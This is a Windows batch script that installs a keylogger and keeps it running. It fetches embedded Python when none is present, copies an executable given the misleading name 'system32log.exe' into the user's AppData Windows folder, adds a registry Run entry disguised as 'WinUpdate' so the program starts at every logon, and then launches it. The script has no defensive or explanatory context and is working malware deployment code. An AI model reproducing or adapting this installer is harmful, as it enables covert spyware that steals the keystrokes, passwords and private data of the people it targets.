@echo off
setlocal EnableDelayedExpansion

:: Paths
set "PYTHON_DIR=%APPDATA%\Python39"
set "PYTHON_EXE=%PYTHON_DIR%\python.exe"
set "EXE_NAME=system32log.exe"
set "EXE_DEST=%APPDATA%\Microsoft\Windows\%EXE_NAME%"

:: Check if Python exists
if not exist "%PYTHON_EXE%" (
    echo Installing embedded Python...
    powershell -Command "Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.9.13/python-3.9.13-embed-amd64.zip -OutFile python.zip"
    powershell -Command "Expand-Archive python.zip -DestinationPath %PYTHON_DIR%"
    del python.zip
)

:: Move EXE
echo Moving keylogger...
if not exist "%APPDATA%\Microsoft\Windows\" mkdir "%APPDATA%\Microsoft\Windows\"
copy /Y "%~dp0%EXE_NAME%" "%EXE_DEST%"

:: Registry Autostart Entry
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WinUpdate /t REG_SZ /d "%EXE_DEST%" /f

:: Run now
start "" "%EXE_DEST%"
exit
